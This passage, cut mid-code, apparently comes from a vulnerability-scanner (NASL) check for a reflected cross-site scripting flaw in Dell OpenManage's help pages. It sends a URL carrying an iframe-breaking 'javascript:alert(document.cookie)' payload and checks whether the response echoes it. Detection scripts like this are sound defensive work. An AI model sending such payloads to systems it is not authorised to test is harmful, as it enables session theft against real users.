...
if(res && IsMatchRegexp( res, "HTTP/1.. 200 OK" ) && ContainsString( res, ">Dell OpenManage <" )){
	url = "/help/sm/en/Output/wwhelp/wwhimpl/js/html/index_main.htm?topic=\"><" + "/iframe><iframe src=\"javascript:alert(document.cookie)";
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(res && IsMatchRegexp( res, "HTTP/1.. 200 OK" ) && ContainsString( res, "javascript:alert(document.cookie)" ) && ContainsString( res, "OMSS_Help" )){
